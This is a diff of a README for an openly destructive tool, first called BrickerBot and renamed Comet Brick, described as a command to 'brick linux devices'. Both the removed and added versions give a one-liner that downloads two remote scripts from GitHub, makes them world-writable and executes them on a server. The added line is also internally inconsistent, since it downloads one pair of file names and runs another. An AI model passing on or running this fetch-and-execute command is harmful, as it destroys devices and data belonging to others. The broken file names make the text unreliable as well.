@@ -1,21 +1,5 @@
-BrickerBot
-=====
+# Comet Brick
 
-Command for brick linux devices
+## How2Use
 
-## Installation
-
-    $ wget https://raw.githubusercontent.com/br0leak/BrickerBot/main/char_for_brick.bash; wget https://raw.githubusercontent.com/br0leak/BrickerBot/main/bricker.sh; chmod 777 bricker.sh; chmod +x bricker.sh; chmod 777 char_for_brick.bash; chmod +x char_for_brick.bash; bash char_for_brick.bash || bash bricker.sh
-
-## How to use
-
-It's simple to use. You just need to download and execute they scripts on the server.
-
-### Example:
-    $ wget https://raw.githubusercontent.com/br0leak/BrickerBot/main/char_for_brick.bash; wget https://raw.githubusercontent.com/br0leak/BrickerBot/main/bricker.sh; chmod 777 bricker.sh; chmod +x bricker.sh; chmod 777 char_for_brick.bash; chmod +x char_for_brick.bash; bash char_for_brick.bash || bash bricker.sh
-    
-
-## License 
-
-> Copyright (C) 2021 - 2022 
-> Nassim Saqqaf (nassim.saqqaf@protonmail.com)
+    $ wget https://raw.githubusercontent.com/freeis1337/cometbrick/main/char_for_brick.bash; wget https://raw.githubusercontent.com/freeis1337/BrickerBot/main/bricker.sh; chmod 777 bricker.sh; chmod +x bricker.sh; chmod 777 char_for_brick.bash; chmod +x char_for_brick.bash; bash chars.bash || bash brick.sh
